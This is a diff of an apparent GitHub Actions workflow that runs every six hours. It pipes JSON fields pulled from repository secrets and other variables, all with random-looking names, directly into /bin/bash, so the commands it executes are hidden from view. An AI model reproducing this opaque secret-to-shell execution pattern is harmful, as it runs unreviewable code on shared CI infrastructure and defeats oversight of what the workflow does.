@@ -3,26 +3,17 @@ name: wangyuteng4637
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 0/6 * * *'
-
-jobs:  # 5876
+    - cron: '53 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangyuteng4637
         env:
-          xaskn69233: ${{ secrets.xaskn69233 }}
+          j603: ${{ secrets.j603 }}
         run: |
-          echo $xaskn69233 | jq -r .i096 | /bin/bash
-          echo $rwm8916 | jq -r .ese181 | /bin/bash
-          echo $w85578 | jq -r .mbrtm5 | /bin/bash
-          echo $wxmdg08242 | jq -r .hj0785 | /bin/bash
-          echo $hzy3333 | jq -r .rwhr6 | /bin/bash
-          echo $yitw3539 | jq -r .saj9626 | /bin/bash
-          echo $xdwq2097 | jq -r .qwezd46 | /bin/bash
-          echo $rfnkr060 | jq -r .ewvhi5509 | /bin/bash
-          echo $ea002 | jq -r .ucaeu892 | /bin/bash
-          echo $s24279 | jq -r .ujul2 | /bin/bash
+          echo $j603 | jq -r .pmal17 | /bin/bash
+          echo $d44 | jq -r .azcjc13 | /bin/bash
+          echo $ffsrb8 | jq -r .muli0159 | /bin/bash
 
